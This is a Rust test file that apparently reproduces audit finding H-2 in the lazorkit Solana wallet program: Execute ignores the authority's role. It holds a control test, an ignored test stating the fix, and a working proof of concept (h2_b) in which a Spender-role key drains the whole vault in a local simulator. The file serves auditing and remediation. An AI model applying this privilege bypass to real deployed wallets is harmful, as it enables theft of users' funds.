//! Reproduction for finding H-2 — `Execute` never reads the authority's
//! `role`, so a Spender has exactly the same power over the vault as an Owner.
//!
//! The permission model advertises three tiers (Owner 0, Admin 1, Spender 2).
//! `role` is checked in `AddAuthority`, `RemoveAuthority`, `CreateSession`,
//! `Authorize` and `RevokeSession` — but the Authority branch of
//! `execute::immediate::process` reads `discriminator`, `wallet` and
//! `authority_type` and then authenticates. `role` is never consulted, and no
//! spending limit is attached to it either; limits only exist on sessions.
//!
//! `h2_a` is the control: it shows `role` genuinely gates the other
//! instructions, so the gap is specific to Execute rather than the role field
//! being ignored everywhere.
//!
//! Run:  cargo test --features devnet -p lazorkit-program --test repro_h2_spender_role

mod common;

use common::*;
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::Keypair,
    signer::Signer,
};

/// `AuthError::PermissionDenied`
const ERR_PERMISSION_DENIED: u32 = 3002;

/// Add an Ed25519 authority with the given role, authorized by the wallet owner.
fn add_ed25519_authority(
    context: &mut TestContext,
    wallet: &WalletFixture,
    new_key: &Keypair,
    new_role: u8,
) -> Result<Pubkey, litesvm::types::FailedTransactionMetadata> {
    let (new_auth_pda, _) = Pubkey::find_program_address(
        &[
            b"authority",
            wallet.wallet_pda.as_ref(),
            new_key.pubkey().as_ref(),
        ],
        &context.program_id,
    );

    let mut data = vec![1u8]; // AddAuthority
    data.push(0); // authority_type = Ed25519
    data.push(new_role);
    data.extend_from_slice(&[0u8; 6]); // padding
    data.extend_from_slice(new_key.pubkey().as_ref());

    let ix = Instruction {
        program_id: context.program_id,
        accounts: vec![
            AccountMeta::new(context.payer.pubkey(), true),
            AccountMeta::new_readonly(wallet.wallet_pda, false),
            AccountMeta::new(wallet.owner_auth_pda, false),
            AccountMeta::new(new_auth_pda, false),
            AccountMeta::new_readonly(solana_sdk::system_program::id(), false),
            AccountMeta::new_readonly(solana_sdk::sysvar::rent::id(), false),
            AccountMeta::new_readonly(wallet.owner.pubkey(), true),
        ],
        data,
    };

    let payer = context.payer.insecure_clone();
    try_send(&mut context.svm, &payer, &[ix], &[&payer, &wallet.owner])?;
    Ok(new_auth_pda)
}

/// `Execute` authorized by an arbitrary authority PDA + its Ed25519 signer.
fn execute_as(
    context: &TestContext,
    wallet: &WalletFixture,
    authority_pda: Pubkey,
    signer: &Keypair,
    recipient: Pubkey,
    lamports: u64,
) -> Instruction {
    Instruction {
        program_id: context.program_id,
        accounts: with_protocol_fee_accounts(
            vec![
                AccountMeta::new(context.payer.pubkey(), true),
                AccountMeta::new_readonly(wallet.wallet_pda, false),
                AccountMeta::new(authority_pda, false),
                AccountMeta::new(wallet.vault_pda, false),
                AccountMeta::new_readonly(solana_sdk::system_program::id(), false),
                AccountMeta::new(recipient, false),
                AccountMeta::new_readonly(signer.pubkey(), true),
            ],
            context,
        ),
        data: vault_transfer_execute_data(lamports),
    }
}

fn lamports_of(context: &TestContext, key: &Pubkey) -> u64 {
    context.svm.get_account(key).map(|a| a.lamports).unwrap_or(0)
}

// ─────────────────────────────────────────────────────────────────────────
// H-2a — CONTROL: `role` is enforced everywhere except Execute
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn h2_a_control_spender_is_blocked_from_privileged_instructions() {
    let mut context = setup_test();
    let wallet = create_ed25519_wallet(&mut context, 500_000_000);

    let spender = Keypair::new();
    let spender_auth = add_ed25519_authority(&mut context, &wallet, &spender, 2)
        .expect("Owner may add a Spender");

    let payer = context.payer.insecure_clone();

    // A Spender cannot add authorities.
    {
        let victim = Keypair::new();
        let (victim_pda, _) = Pubkey::find_program_address(
            &[
                b"authority",
                wallet.wallet_pda.as_ref(),
                victim.pubkey().as_ref(),
            ],
            &context.program_id,
        );

        let mut data = vec![1u8, 0, 2];
        data.extend_from_slice(&[0u8; 6]);
        data.extend_from_slice(victim.pubkey().as_ref());

        let ix = Instruction {
            program_id: context.program_id,
            accounts: vec![
                AccountMeta::new(payer.pubkey(), true),
                AccountMeta::new_readonly(wallet.wallet_pda, false),
                AccountMeta::new(spender_auth, false), // Spender as the authorizer
                AccountMeta::new(victim_pda, false),
                AccountMeta::new_readonly(solana_sdk::system_program::id(), false),
                AccountMeta::new_readonly(solana_sdk::sysvar::rent::id(), false),
                AccountMeta::new_readonly(spender.pubkey(), true),
            ],
            data,
        };

        assert_custom_error(
            try_send(&mut context.svm, &payer, &[ix], &[&payer, &spender]),
            ERR_PERMISSION_DENIED,
            "H-2a: Spender must not be able to add authorities (manage.rs:230)",
        );
    }

    // A Spender cannot create sessions.
    {
        advance(&mut context.svm);
        let session = Keypair::new();
        let (session_pda, _) = Pubkey::find_program_address(
            &[
                b"session",
                wallet.wallet_pda.as_ref(),
                session.pubkey().as_ref(),
            ],
            &context.program_id,
        );
        let clock: solana_sdk::clock::Clock = context.svm.get_sysvar();

        let mut data = vec![5u8];
        data.extend_from_slice(session.pubkey().as_ref());
        data.extend_from_slice(&(clock.slot + 100_000).to_le_bytes());
        data.extend_from_slice(&0u16.to_le_bytes());

        let ix = Instruction {
            program_id: context.program_id,
            accounts: vec![
                AccountMeta::new(payer.pubkey(), true),
                AccountMeta::new_readonly(wallet.wallet_pda, false),
                AccountMeta::new(spender_auth, false),
                AccountMeta::new(session_pda, false),
                AccountMeta::new_readonly(solana_sdk::system_program::id(), false),
                AccountMeta::new_readonly(solana_sdk::sysvar::rent::id(), false),
                AccountMeta::new_readonly(spender.pubkey(), true),
            ],
            data,
        };

        assert_custom_error(
            try_send(&mut context.svm, &payer, &[ix], &[&payer, &spender]),
            ERR_PERMISSION_DENIED,
            "H-2a: Spender must not be able to create sessions (session/create.rs:199)",
        );
    }
}

// ─────────────────────────────────────────────────────────────────────────
// H-2b — but Execute does not look at `role` at all
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn h2_b_spender_can_drain_the_whole_vault() {
    let mut context = setup_test();
    let vault_funding = 500_000_000; // 0.5 SOL
    let wallet = create_ed25519_wallet(&mut context, vault_funding);

    let spender = Keypair::new();
    let spender_auth = add_ed25519_authority(&mut context, &wallet, &spender, 2)
        .expect("Owner may add a Spender");

    // Confirm the account really was created with role = Spender and not
    // silently downgraded — byte 2 of AuthorityAccountHeader is `role`.
    let header = context
        .svm
        .get_account(&spender_auth)
        .expect("spender authority exists")
        .data;
    assert_eq!(header[2], 2, "authority was stored with role = Spender");

    let recipient = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();

    // "Spender" implies a bounded allowance. There is none: this moves 80% of
    // the vault in a single instruction, and nothing in Execute objects.
    let stolen = 400_000_000;
    let ix = execute_as(&context, &wallet, spender_auth, &spender, recipient, stolen);

    try_send(&mut context.svm, &payer, &[ix], &[&payer, &spender])
        .expect("H-2b: Execute accepted a Spender authority with no limit at all");

    assert_eq!(
        lamports_of(&context, &recipient),
        stolen,
        "H-2b: a Spender moved {stolen} lamports with no cap, no session, no action buffer"
    );
    assert_eq!(
        lamports_of(&context, &wallet.vault_pda),
        vault_funding - stolen,
        "H-2b: straight out of the vault"
    );

    // And it can keep going until the vault is empty.
    advance(&mut context.svm);
    let rest = lamports_of(&context, &wallet.vault_pda);
    let ix = execute_as(&context, &wallet, spender_auth, &spender, recipient, rest);
    try_send(&mut context.svm, &payer, &[ix], &[&payer, &spender])
        .expect("H-2b: nothing rate-limits a Spender");

    assert_eq!(
        lamports_of(&context, &wallet.vault_pda),
        0,
        "H-2b: vault emptied by an authority the model calls 'Spender'"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// H-2c — the fix, stated as a test
// ─────────────────────────────────────────────────────────────────────────

/// After the Authority branch of `execute::immediate::process` rejects
/// `authority_header.role > 1`, a Spender can no longer execute. Owner and
/// Admin still can.
#[test]
#[ignore = "enable together with the Execute role check; fails until then"]
fn h2_c_spender_should_not_be_able_to_execute() {
    let mut context = setup_test();
    let vault_funding = 500_000_000;
    let wallet = create_ed25519_wallet(&mut context, vault_funding);

    let spender = Keypair::new();
    let spender_auth =
        add_ed25519_authority(&mut context, &wallet, &spender, 2).expect("add Spender");

    let admin = Keypair::new();
    let admin_auth = add_ed25519_authority(&mut context, &wallet, &admin, 1).expect("add Admin");

    let recipient = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();

    let spender_ix = execute_as(&context, &wallet, spender_auth, &spender, recipient, 1_000_000);
    assert_custom_error(
        try_send(&mut context.svm, &payer, &[spender_ix], &[&payer, &spender]),
        ERR_PERMISSION_DENIED,
        "H-2c: Spender must not be able to Execute",
    );
    assert_eq!(lamports_of(&context, &recipient), 0, "H-2c: nothing moved");

    // Admin must still work — the fix must not break the tier above.
    advance(&mut context.svm);
    let admin_ix = execute_as(&context, &wallet, admin_auth, &admin, recipient, 1_000_000);
    try_send(&mut context.svm, &payer, &[admin_ix], &[&payer, &admin])
        .expect("H-2c: Admin must still be able to Execute");

    // And so must Owner.
    advance(&mut context.svm);
    let owner_ix = execute_as(
        &context,
        &wallet,
        wallet.owner_auth_pda,
        &wallet.owner,
        recipient,
        1_000_000,
    );
    try_send(&mut context.svm, &payer, &[owner_ix], &[&payer, &wallet.owner])
        .expect("H-2c: Owner must still be able to Execute");

    assert_eq!(lamports_of(&context, &recipient), 2_000_000);
}
